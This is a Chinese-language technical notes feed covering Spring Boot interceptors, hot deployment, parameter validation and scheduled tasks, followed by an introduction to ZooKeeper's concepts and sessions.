<h3 id="interceptor介绍" tabindex="-1"> Interceptor介绍</h3>
<p><strong>拦截器(Interceptor)</strong> 同Filter 过滤器一样，它俩都是面向切面编程——AOP 的具体实现。</p>
<p>你可以使用 Interceptor 来执行某些任务，例如在 <strong>Controller</strong> 处理请求之前编写日志，添加或更新配置......</p>
<p>在 <strong>Spring中</strong>，当请求发送到 <strong>Controller</strong> 时，在被<strong>Controller</strong>处理之前，它必须经过 <strong>Interceptors</strong>（0或更多）。</p>
<p><strong>Spring Interceptor</strong>是一个非常类似于<strong>Servlet Filter</strong> 的概念 。</p>
<h3 id="过滤器和拦截器的区别" tabindex="-1"> 过滤器和拦截器的区别</h3>
<p>对于过滤器和拦截器的区别， <a href="https://www.zhihu.com/question/35225845/answer/61876681" target="_blank" rel="noopener noreferrer">知乎@Kangol LI</a> 的回答很不错。</p>
<ul>
<li>过滤器（Filter）：当你有一堆东西的时候，你只希望选择符合你要求的某一些东西。定义这些要求的工具，就是过滤器。</li>
<li>拦截器（Interceptor）：在一个流程正在进行的时候，你希望干预它的进展，甚至终止它进行，这是拦截器做的事情。</li>
</ul>
<h3 id="自定义-interceptor" tabindex="-1"> 自定义 Interceptor</h3>
<p>如果你需要自定义 <strong>Interceptor</strong> 的话必须实现 <strong>org.springframework.web.servlet.HandlerInterceptor</strong>接口或继承 <strong>org.springframework.web.servlet.handler.HandlerInterceptorAdapter</strong>类，并且需要重写下面下面3个方法：</p>
<div><pre><code>    <span>public</span> <span>boolean</span> <span>preHandle</span><span>(</span><span>HttpServletRequest</span> request<span>,</span> <span>HttpServletResponse</span> response<span>,</span> <span>Object</span> handler<span>)</span> <span>{</span>
    <span>}</span>


    <span>public</span> <span>void</span> <span>postHandle</span><span>(</span><span>HttpServletRequest</span> request<span>,</span> <span>HttpServletResponse</span> response<span>,</span>
                           <span>Object</span> handler<span>,</span> <span>ModelAndView</span> modelAndView<span>)</span> <span>{</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>afterCompletion</span><span>(</span><span>HttpServletRequest</span> request<span>,</span> <span>HttpServletResponse</span> response<span>,</span>
                                <span>Object</span> handler<span>,</span> <span>Exception</span> ex<span>)</span> <span>{</span>
    <span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><p>注意： <em><strong>preHandle</strong></em>方法返回 <strong>true</strong>或 <strong>false</strong>。如果返回 <strong>true</strong>，则意味着请求将继续到达 <strong>Controller</strong> 被处理。</p>
<p><img src="@source/assets/cs-note/framework/spring/interceptor-spring.png" alt="" loading="lazy"></p>
<p><strong>配置拦截器</strong></p>
<div><pre><code><span>@Configuration</span>
<span>public</span> <span>class</span> <span>WebConfig</span> <span>implements</span> <span>WebMvcConfigurer</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>addInterceptors</span><span>(</span><span>InterceptorRegistry</span> registry<span>)</span> <span>{</span>
        <span>// LogInterceptor apply to all URLs.</span>
        registry<span>.</span><span>addInterceptor</span><span>(</span><span>new</span> <span>MyInterceptor</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h2 id="spring-boot-异常处理" tabindex="-1"> Spring Boot 异常处理</h2>
<h3 id="controlleradvice和-exceptionhandler处理全局异常" tabindex="-1"> @ControllerAdvice和@ExceptionHandler处理全局异常</h3>
<h3 id="exceptionhandler-处理-controller-级别的异常" tabindex="-1"> @ExceptionHandler 处理 Controller 级别的异常</h3>
<h3 id="responsestatusexception" tabindex="-1"> ResponseStatusException</h3>
<h3 id="常用解决方案" tabindex="-1"> 常用解决方案</h3>
<h2 id="spring-boot-热部署" tabindex="-1"> Spring Boot 热部署</h2>
<blockquote>
<p>热部署可以简单的这样理解：我们修改程序代码后不需要重新启动程序，就可以获取到最新的代码，更新程序对外的行为。</p>
</blockquote>
<p>通过 SpringBoot 提供的 spring-boot-devtools 实现简单的热部署。</p>
<p><strong>依赖:</strong></p>
<p>Maven:</p>
<div><pre><code>		<span><span><span>&lt;</span>dependency</span><span>></span></span>
			<span><span><span>&lt;</span>groupId</span><span>></span></span>org.springframework.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>
			<span><span><span>&lt;</span>artifactId</span><span>></span></span>spring-boot-devtools<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
            <span><span><span>&lt;</span>scope</span><span>></span></span>runtime<span><span><span>&lt;/</span>scope</span><span>></span></span>
			<span><span><span>&lt;</span>optional</span><span>></span></span>true<span><span><span>&lt;/</span>optional</span><span>></span></span>
		<span><span><span>&lt;/</span>dependency</span><span>></span></span>
</code></pre></div><div><pre><code>  <span><span><span>&lt;</span>plugin</span><span>></span></span>
     <span><span><span>&lt;</span>groupId</span><span>></span></span>org.springframework.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>
     <span><span><span>&lt;</span>artifactId</span><span>></span></span>spring-boot-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
  <span><span><span>&lt;/</span>plugin</span><span>></span></span>
</code></pre></div><p>Gradle:</p>
<div><pre><code>configurations <span>{</span>
    developmentOnly
    runtimeClasspath <span>{</span>
        extendsFrom developmentOnly
    <span>}</span>
<span>}</span>
dependencies <span>{</span>
      <span>developmentOnly</span><span>(</span><span><span>"org.springframework.boot:spring-boot-devtools"</span></span><span>)</span>
<span>}</span>

</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h1 id="spring-boot-进阶" tabindex="-1"> Spring Boot 进阶</h1>
<h2 id="bean映射工具" tabindex="-1"> Bean映射工具</h2>
<p>在实际项目开发过程中，经常需要将不同的两个对象实例进行属性复制，从而基于源对象的属性信息进行后续操作，而不改变源对象的属性信息,比如DTO数据传输对象和数据对象DO，我们需要将DO对象进行属性复制到DTO，但是对象格式又不一样，所以我们需要编写映射代码将对象中的属性值从一种类型转换成另一种类型。</p>
<p>创建由多个层组成的大型 Java 应用程序需要使用多种领域模型，如持久化模型、领域模型或者所谓的 DTO。为不同的应用程序层使用多个模型将要求我们提供 bean 之间的映射方法。手动执行此操作可以快速创建大量样板代码并消耗大量时间。幸运的是，Java 有多个对象映射框架。</p>
<h2 id="参数校验" tabindex="-1"> 参数校验</h2>
<p>即使在前端对数据进行校验的情况下，我们还是要对传入后端的数据再进行一遍校验，避免用户绕过浏览器直接通过一些 HTTP 工具直接向后端请求一些违法数据</p>
<h3 id="校验注解" tabindex="-1"> 校验注解</h3>
<p><strong>JSR提供的校验注解</strong></p>
<ul>
<li><code>@Null</code>   被注释的元素必须为 null</li>
<li><code>@NotNull</code>    被注释的元素必须不为 null</li>
<li><code>@AssertTrue</code>     被注释的元素必须为 true</li>
<li><code>@AssertFalse</code>    被注释的元素必须为 false</li>
<li><code>@Min(value) </code>    被注释的元素必须是一个数字，其值必须大于等于指定的最小值</li>
<li><code>@Max(value) </code>    被注释的元素必须是一个数字，其值必须小于等于指定的最大值</li>
<li><code>@DecimalMin(value) </code> 被注释的元素必须是一个数字，其值必须大于等于指定的最小值</li>
<li><code>@DecimalMax(value)</code>  被注释的元素必须是一个数字，其值必须小于等于指定的最大值</li>
<li><code>@Size(max=, min=) </code>  被注释的元素的大小必须在指定的范围内</li>
<li><code>@Digits (integer, fraction) </code>    被注释的元素必须是一个数字，其值必须在可接受的范围内</li>
<li><code>@Past </code>  被注释的元素必须是一个过去的日期</li>
<li><code>@Future</code>     被注释的元素必须是一个将来的日期</li>
<li><code>@Pattern(regex=,flag=) </code> 被注释的元素必须符合指定的正则表达式</li>
</ul>
<p><strong>Hibernate Validator提供的校验注解</strong>：</p>
<ul>
<li><code>@NotBlank(message =) </code>  验证字符串非null，且长度必须大于0</li>
<li><code>@Email</code>  被注释的元素必须是电子邮箱地址</li>
<li><code>@Length(min=,max=) </code> 被注释的字符串的大小必须在指定的范围内</li>
<li><code>@NotEmpty </code>  被注释的字符串的必须非空</li>
<li><code>@Range(min=,max=,message=)</code>  被注释的元素必须在合适的范围内</li>
</ul>
<h3 id="验证controller的输入" tabindex="-1"> 验证Controller的输入</h3>
<p><strong>验证请求体(RequestBody)</strong></p>
<p>在需要验证的参数上加上了<code>@Valid</code>注解，如果验证失败，它将抛出<code>MethodArgumentNotValidException</code>。默认情况下，Spring会将此异常转换为HTTP Status 400（错误请求）。</p>
<p><strong>验证请求参数(Path Variables 和 Request Parameters)</strong></p>
<p>在需要验证的参数上加上了<code>@Valid</code>注解</p>
<p>一定不要忘记在类上加上 <code>Validated</code> 注解了，这个参数可以告诉 Spring 去校验方法参数。</p>
<h3 id="验证-service-中的方法" tabindex="-1"> 验证 Service 中的方法</h3>
<p>还可以验证任何Spring组件的输入，而不是验证控制器级别的输入，我们可以使用<code>@Validated</code>和<code>@Valid</code>注释的组合来实现这一需求。</p>
<p>一定不要忘记在类上加上 <code>Validated</code> 注解了，这个参数可以告诉 Spring 去校验方法参数。</p>
<h3 id="validator-编程方式手动进行参数验证" tabindex="-1"> Validator 编程方式手动进行参数验证</h3>
<p>某些场景下可能会需要我们手动校验并获得校验结果。</p>
<div><pre><code>        <span>ValidatorFactory</span> factory <span>=</span> <span>Validation</span><span>.</span><span>buildDefaultValidatorFactory</span><span>(</span><span>)</span><span>;</span>
        <span>Validator</span> validator <span>=</span> factory<span>.</span><span>getValidator</span><span>(</span><span>)</span><span>;</span>
        <span>.</span><span>.</span><span>.</span>
        <span>Set</span><span><span>&lt;</span><span>ConstraintViolation</span><span>&lt;</span><span>T</span><span>></span><span>></span></span> violations <span>=</span> validator<span>.</span><span>validate</span><span>(</span>t<span>)</span><span>;</span>
</code></pre></div><p>上面是通过 <code>Validator</code> 工厂类获得的 <code>Validator</code> 示例，当然你也可以通过 <code>@Autowired</code>  直接注入的方式。但是在非 Spring Component 类中使用这种方式的话，只能通过工厂类来获得 <code>Validator</code>。</p>
<div><pre><code>        <span>@Autowired</span>
        <span>Validator</span> validator<span>;</span>
</code></pre></div><h3 id="自定义-validator" tabindex="-1"> 自定义 Validator</h3>
<p>如果自带的校验注解无法满足需求的话，还可以自定义实现注解。</p>
<p><strong>案例:校验特定字段的值是否在可选范围</strong></p>
<p>比如我们现在多了这样一个需求：多了一个 region 字段，region 字段只能是<code>China</code>、<code>China-Taiwan</code>、<code>China-HongKong</code>这三个中的一个。</p>
<div><pre><code><span>@Target</span><span>(</span><span>{</span>FIELD<span>}</span><span>)</span>
<span>@Retention</span><span>(</span>RUNTIME<span>)</span>
<span>@Constraint</span><span>(</span>validatedBy <span>=</span> <span>RegionValidator</span><span>.</span><span>class</span><span>)</span>
<span>@Documented</span>
<span>public</span> <span>@interface</span> <span>Region</span> <span>{</span>

    <span>String</span> <span>message</span><span>(</span><span>)</span> <span>default</span> <span>"Region 值不在可选范围内"</span><span>;</span>

    <span>Class</span><span><span>&lt;</span><span>?</span><span>></span></span><span>[</span><span>]</span> <span>groups</span><span>(</span><span>)</span> <span>default</span> <span>{</span><span>}</span><span>;</span>

    <span>Class</span><span><span>&lt;</span><span>?</span> <span>extends</span> <span>Payload</span><span>></span></span><span>[</span><span>]</span> <span>payload</span><span>(</span><span>)</span> <span>default</span> <span>{</span><span>}</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><p>第二步你需要实现 <code>ConstraintValidator</code>接口，并重写<code>isValid</code> 方法：</p>
<div><pre><code><span>import</span> <span><span>javax<span>.</span>validation<span>.</span></span><span>ConstraintValidator</span></span><span>;</span>
<span>import</span> <span><span>javax<span>.</span>validation<span>.</span></span><span>ConstraintValidatorContext</span></span><span>;</span>
<span>import</span> <span><span>java<span>.</span>util<span>.</span></span><span>HashSet</span></span><span>;</span>

<span>public</span> <span>class</span> <span>RegionValidator</span> <span>implements</span> <span>ConstraintValidator</span><span><span>&lt;</span><span>Region</span><span>,</span> <span>String</span><span>></span></span> <span>{</span>

    <span>@Override</span>
    <span>public</span> <span>boolean</span> <span>isValid</span><span>(</span><span>String</span> value<span>,</span> <span>ConstraintValidatorContext</span> context<span>)</span> <span>{</span>
        <span>HashSet</span><span><span>&lt;</span><span>Object</span><span>></span></span> regions <span>=</span> <span>new</span> <span>HashSet</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
        regions<span>.</span><span>add</span><span>(</span><span>"China"</span><span>)</span><span>;</span>
        regions<span>.</span><span>add</span><span>(</span><span>"China-Taiwan"</span><span>)</span><span>;</span>
        regions<span>.</span><span>add</span><span>(</span><span>"China-HongKong"</span><span>)</span><span>;</span>
        <span>return</span> regions<span>.</span><span>contains</span><span>(</span>value<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>

</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><p>现在可以使用这个注解：</p>
<div><pre><code>    <span>@Region</span>
    <span>private</span> <span>String</span> region<span>;</span>
</code></pre></div><h3 id="notnull-vs-column-nullable-false" tabindex="-1"> <code>@NotNull</code> vs <code>@Column(nullable = false)</code></h3>
<p>在使用 JPA 操作数据的时候会经常碰到 <code>@Column(nullable = false)</code>  这种类型的约束，那么它和 <code>@NotNull</code> 有何区别呢？搞清楚这个还是很重要的！</p>
<ul>
<li><code>@NotNull</code>是 JSR 303 Bean验证批注,它与数据库约束本身无关。</li>
<li><code>@Column(nullable = false)</code> : 是JPA声明列为非空的方法。</li>
</ul>
<p>总结来说就是即前者用于验证，而后者则用于指示数据库创建表的时候对表的约束。</p>
<h2 id="spring-schedule-定时任务" tabindex="-1"> Spring Schedule 定时任务</h2>
<h3 id="创建-scheduled-task" tabindex="-1"> 创建 scheduled task</h3>
<p>使用 <code>@Scheduled</code> 注解就能很方便地创建一个定时任务，下面的代码中涵盖了 <code>@Scheduled </code>的常见用法，包括：固定速率执行、固定延迟执行、初始延迟执行、使用 Cron 表达式执行定时任务。</p>
<blockquote>
<p>Cron 表达式:  主要用于定时作业(定时任务)系统定义执行时间或执行频率的表达式，非常厉害，你可以通过 Cron 表达式进行设置定时任务每天或者每个月什么时候执行等等操作。</p>
<p>推荐一个在线Cron表达式生成器：<a href="http://cron.qqe2.com/" target="_blank" rel="noopener noreferrer">http://cron.qqe2.com/</a></p>
</blockquote>
<div><pre><code><span>@Component</span>
<span>public</span> <span>class</span> <span>ScheduledTasks</span> <span>{</span>
    <span>private</span> <span>static</span> <span>final</span> <span>Logger</span> log <span>=</span> <span>LoggerFactory</span><span>.</span><span>getLogger</span><span>(</span><span>ScheduledTasks</span><span>.</span><span>class</span><span>)</span><span>;</span>
    <span>private</span> <span>static</span> <span>final</span> <span>SimpleDateFormat</span> dateFormat <span>=</span> <span>new</span> <span>SimpleDateFormat</span><span>(</span><span>"HH:mm:ss"</span><span>)</span><span>;</span>

    <span>/**
     * fixedRate：固定速率执行。每5秒执行一次。
     */</span>
    <span>@Scheduled</span><span>(</span>fixedRate <span>=</span> <span>5000</span><span>)</span>
    <span>public</span> <span>void</span> <span>reportCurrentTimeWithFixedRate</span><span>(</span><span>)</span> <span>{</span>
        log<span>.</span><span>info</span><span>(</span><span>"Current Thread : {}"</span><span>,</span> <span>Thread</span><span>.</span><span>currentThread</span><span>(</span><span>)</span><span>.</span><span>getName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        log<span>.</span><span>info</span><span>(</span><span>"Fixed Rate Task : The time is now {}"</span><span>,</span> dateFormat<span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>/**
     * fixedDelay：固定延迟执行。距离上一次调用成功后2秒才执。
     */</span>
    <span>@Scheduled</span><span>(</span>fixedDelay <span>=</span> <span>2000</span><span>)</span>
    <span>public</span> <span>void</span> <span>reportCurrentTimeWithFixedDelay</span><span>(</span><span>)</span> <span>{</span>
        <span>try</span> <span>{</span>
            <span>TimeUnit</span><span>.</span>SECONDS<span>.</span><span>sleep</span><span>(</span><span>3</span><span>)</span><span>;</span>
            log<span>.</span><span>info</span><span>(</span><span>"Fixed Delay Task : The time is now {}"</span><span>,</span> dateFormat<span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
        <span>}</span> <span>catch</span> <span>(</span><span>InterruptedException</span> e<span>)</span> <span>{</span>
            e<span>.</span><span>printStackTrace</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>/**
     * initialDelay:初始延迟。任务的第一次执行将延迟5秒，然后将以5秒的固定间隔执行。
     */</span>
    <span>@Scheduled</span><span>(</span>initialDelay <span>=</span> <span>5000</span><span>,</span> fixedRate <span>=</span> <span>5000</span><span>)</span>
    <span>public</span> <span>void</span> <span>reportCurrentTimeWithInitialDelay</span><span>(</span><span>)</span> <span>{</span>
        log<span>.</span><span>info</span><span>(</span><span>"Fixed Rate Task with Initial Delay : The time is now {}"</span><span>,</span> dateFormat<span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>/**
     * cron：使用Cron表达式。　每分钟的1，2秒运行
     */</span>
    <span>@Scheduled</span><span>(</span>cron <span>=</span> <span>"1-2 * * * * ? "</span><span>)</span>
    <span>public</span> <span>void</span> <span>reportCurrentTimeWithCronExpression</span><span>(</span><span>)</span> <span>{</span>
        log<span>.</span><span>info</span><span>(</span><span>"Cron Expression: The time is now {}"</span><span>,</span> dateFormat<span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br></div></div><h3 id="启动类-enablescheduling注解" tabindex="-1"> 启动类<code>@EnableScheduling</code>注解</h3>
<p>在 SpringBoot 中需要在启动类上加上<code>@EnableScheduling</code>便可以启动定时任务了。</p>
<h3 id="自定义线程池执行-scheduled-task" tabindex="-1"> 自定义线程池执行 scheduled task</h3>
<p>默认情况下，<code>@Scheduled</code>任务都在Spring创建的大小为1的默认线程池中执行</p>
<p>如果需要自定义线程池执行话只需要新加一个实现<code>SchedulingConfigurer</code>接口的 <code>configureTasks</code> 的类即可，这个类需要加上 <code>@Configuration</code> 注解。</p>
<div><pre><code><span>@Configuration</span>
<span>public</span> <span>class</span> <span>SchedulerConfig</span> <span>implements</span> <span>SchedulingConfigurer</span> <span>{</span>
    <span>private</span> <span>final</span> <span>int</span> POOL_SIZE <span>=</span> <span>10</span><span>;</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>configureTasks</span><span>(</span><span>ScheduledTaskRegistrar</span> scheduledTaskRegistrar<span>)</span> <span>{</span>
        <span>ThreadPoolTaskScheduler</span> threadPoolTaskScheduler <span>=</span> <span>new</span> <span>ThreadPoolTaskScheduler</span><span>(</span><span>)</span><span>;</span>

        threadPoolTaskScheduler<span>.</span><span>setPoolSize</span><span>(</span>POOL_SIZE<span>)</span><span>;</span>
        threadPoolTaskScheduler<span>.</span><span>setThreadNamePrefix</span><span>(</span><span>"my-scheduled-task-pool-"</span><span>)</span><span>;</span>
        threadPoolTaskScheduler<span>.</span><span>initialize</span><span>(</span><span>)</span><span>;</span>

        scheduledTaskRegistrar<span>.</span><span>setTaskScheduler</span><span>(</span>threadPoolTaskScheduler<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h3 id="enableasync-和-async-使定时任务并行执行" tabindex="-1"> @EnableAsync 和 @Async  使定时任务并行执行</h3>
<p>如果想要代码并行执行的话，还可以通过<code>@EnableAsync</code> 和 @<code>Async </code>这两个注解实现</p>
<div><pre><code><span>@Component</span>
<span>@EnableAsync</span>
<span>public</span> <span>class</span> <span>AsyncScheduledTasks</span> <span>{</span>
    <span>private</span> <span>static</span> <span>final</span> <span>Logger</span> log <span>=</span> <span>LoggerFactory</span><span>.</span><span>getLogger</span><span>(</span><span>AsyncScheduledTasks</span><span>.</span><span>class</span><span>)</span><span>;</span>
    <span>private</span> <span>static</span> <span>final</span> <span>SimpleDateFormat</span> dateFormat <span>=</span> <span>new</span> <span>SimpleDateFormat</span><span>(</span><span>"HH:mm:ss"</span><span>)</span><span>;</span>

    <span>/**
     * fixedDelay：固定延迟执行。距离上一次调用成功后2秒才执。
     */</span>
    <span>//@Async</span>
    <span>@Scheduled</span><span>(</span>fixedDelay <span>=</span> <span>2000</span><span>)</span>
    <span>public</span> <span>void</span> <span>reportCurrentTimeWithFixedDelay</span><span>(</span><span>)</span> <span>{</span>
        <span>try</span> <span>{</span>
            <span>TimeUnit</span><span>.</span>SECONDS<span>.</span><span>sleep</span><span>(</span><span>3</span><span>)</span><span>;</span>
            log<span>.</span><span>info</span><span>(</span><span>"Fixed Delay Task : The time is now {}"</span><span>,</span> dateFormat<span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
        <span>}</span> <span>catch</span> <span>(</span><span>InterruptedException</span> e<span>)</span> <span>{</span>
            e<span>.</span><span>printStackTrace</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><p>运行程序输出如下，<code>reportCurrentTimeWithFixedDelay()</code>  方法会每5秒执行一次，因为<code>@Scheduled</code>任务都在Spring创建的大小为1的默认线程池中执行。</p>
<div><pre><code>Current Thread : scheduling-1
Fixed Delay Task : The time is now 14:24:23
Current Thread : scheduling-1
Fixed Delay Task : The time is now 14:24:28
Current Thread : scheduling-1
Fixed Delay Task : The time is now 14:24:33
</code></pre></div><p><code>reportCurrentTimeWithFixedDelay()</code> 方法上加上 <code>@Async</code>   注解后输出如下，<code>reportCurrentTimeWithFixedDelay()</code>  方法会每 2 秒执行一次。</p>
<div><pre><code>Current Thread : task-1
Fixed Delay Task : The time is now 14:27:32
Current Thread : task-2
Fixed Delay Task : The time is now 14:27:34
Current Thread : task-3
Fixed Delay Task : The time is now 14:27:36
</code></pre></div><h2 id="spring-boot-异步编程" tabindex="-1"> Spring Boot 异步编程</h2>
<h1 id="spring-security" tabindex="-1"> Spring Security</h1>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Zookeeper 介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Zookeeper.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Zookeeper.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>

<h1 id="zookeeper-介绍" tabindex="-1"> Zookeeper 介绍</h1>
<h2 id="zookeeper-的由来" tabindex="-1"> ZooKeeper 的由来</h2>
<p><strong>下面这段内容摘自《从Paxos到Zookeeper》第四章第一节的某段内容：</strong></p>
<blockquote>
<p>Zookeeper最早起源于雅虎研究院的一个研究小组。在当时，研究人员发现，在雅虎内部很多大型系统基本都需要依赖一个类似的系统来进行分布式协调，但是这些系统往往都存在分布式单点问题。所以，<strong>雅虎的开发人员就试图开发一个通用的无单点问题的分布式协调框架，以便让开发人员将精力集中在处理业务逻辑上。</strong></p>
<p>关于“ZooKeeper”这个项目的名字，其实也有一段趣闻。在立项初期，考虑到之前内部很多项目都是使用动物的名字来命名的（例如著名的Pig项目),雅虎的工程师希望给这个项目也取一个动物的名字。时任研究院的首席科学家RaghuRamakrishnan开玩笑地说：“在这样下去，我们这儿就变成动物园了！”此话一出，大家纷纷表示就叫动物园管理员吧一一一因为各个以动物命名的分布式组件放在一起，<strong>雅虎的整个分布式系统看上去就像一个大型的动物园了，而Zookeeper正好要用来进行分布式环境的协调一一于是，Zookeeper的名字也就由此诞生了。</strong></p>
</blockquote>
<h2 id="zookeeper-概览" tabindex="-1"> ZooKeeper 概览</h2>
<p>ZooKeeper 是一个开源的分布式协调服务，ZooKeeper框架最初是在“Yahoo!&quot;上构建的，用于以简单而稳健的方式访问他们的应用程序。 后来，Apache ZooKeeper成为Hadoop，HBase和其他分布式框架使用的有组织服务的标准。 例如，Apache HBase使用ZooKeeper跟踪分布式数据的状态。<strong>ZooKeeper 的设计目标是将那些复杂且容易出错的分布式一致性服务封装起来，构成一个高效可靠的原语集，并以一系列简单易用的接口提供给用户使用。</strong></p>
<blockquote>
<p><strong>原语：</strong> 操作系统或计算机网络用语范畴。是由若干条指令组成的，用于完成一定功能的一个过程。具有不可分割性，即原语的执行必须是连续的，在执行过程中不允许被中断。</p>
</blockquote>
<p><strong>ZooKeeper 是一个典型的分布式数据一致性解决方案，分布式应用程序可以基于 ZooKeeper 实现诸如数据发布/订阅、负载均衡、命名服务、分布式协调/通知、集群管理、Master 选举、分布式锁和分布式队列等功能。</strong></p>
<p><strong>Zookeeper 一个最常用的使用场景就是用于担任服务生产者和服务消费者的注册中心(提供发布订阅服务)。</strong> 服务生产者将自己提供的服务注册到Zookeeper中心，服务的消费者在进行服务调用的时候先到Zookeeper中查找服务，获取到服务生产者的详细信息之后，再去调用服务生产者的内容与数据。如下图所示，在 Dubbo架构中 Zookeeper 就担任了注册中心这一角色。</p>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubbo架构.png" alt="Dubbo" loading="lazy"></p>
<h1 id="zookeeper-的重要概念" tabindex="-1"> ZooKeeper 的重要概念</h1>
<h2 id="总结" tabindex="-1"> 总结</h2>
<ul>
<li><strong>ZooKeeper 本身就是一个分布式程序（只要半数以上节点存活，ZooKeeper 就能正常服务）。</strong></li>
<li><strong>为了保证高可用，最好是以集群形态来部署 ZooKeeper，这样只要集群中大部分机器是可用的（能够容忍一定的机器故障），那么 ZooKeeper 本身仍然是可用的。</strong></li>
<li><strong>ZooKeeper  将数据保存在内存中，这也就保证了高吞吐量和低延迟</strong>（但是内存限制了能够存储的容量不太大，此限制也是保持znode中存储的数据量较小的进一步原因）。</li>
<li><strong>ZooKeeper 是高性能的。 在“读”多于“写”的应用程序中尤其地高性能，因为“写”会导致所有的服务器间同步状态。</strong>（“读”多于“写”是协调服务的典型场景。）</li>
<li><strong>ZooKeeper有临时节点的概念。 当创建临时节点的客户端会话一直保持活动，瞬时节点就一直存在。而当会话终结时，瞬时节点被删除。持久节点是指一旦这个ZNode被创建了，除非主动进行ZNode的移除操作，否则这个ZNode将一直保存在Zookeeper上。</strong></li>
<li>ZooKeeper 底层其实只提供了两个功能：
<ul>
<li>管理（存储、读取）用户程序提交的数据；</li>
<li>为用户程序提供数据节点监听服务。</li>
</ul>
</li>
</ul>
<h2 id="会话-session" tabindex="-1"> 会话（Session）</h2>
<p>Session 指的是 ZooKeeper  服务器与客户端会话。<strong>在 ZooKeeper 中，一个客户端连接是指客户端和服务器之间的一个 TCP 长连接</strong>。客户端启动的时候，首先会与服务器建立一个 TCP 连接，从第一次连接建立开始，客户端会话的生命周期也开始了。<strong>通过这个连接，客户端能够通过心跳检测与服务器保持有效的会话，也能够向Zookeeper服务器发送请求并接受响应，同时还能够通过该连接接收来自服务器的Watch事件通知。</strong> Session的<code>sessionTimeout</code>值用来设置一个客户端会话的超时时间。当由于服务器压力太大、网络故障或是客户端主动断开连接等各种原因导致客户端连接断开时，<strong>只要在<code>sessionTimeout</code>规定的时间内能够重新连接上集群中任意一台服务器，那么之前创建的会话仍然有效。</strong></p>
